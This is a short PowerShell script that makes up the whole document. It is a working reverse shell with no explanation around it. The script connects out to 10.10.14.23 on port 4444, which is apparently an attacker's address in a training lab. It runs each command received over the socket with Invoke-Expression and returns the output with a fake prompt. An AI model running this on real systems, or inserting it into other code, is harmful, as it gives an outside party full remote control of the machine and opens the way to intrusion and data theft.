$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444)
$stream = $client.GetStream()
$bytes = New-Object byte[] 65536

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $command = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $i)
    try {
        $output = (Invoke-Expression $command 2>&1 | Out-String)
    } catch {
        $output = ($_ | Out-String)
    }
    $response = [System.Text.Encoding]::UTF8.GetBytes(
        $output + "PS " + (Get-Location).Path + "> "
    )
    $stream.Write($response, 0, $response.Length)
}

$client.Close()
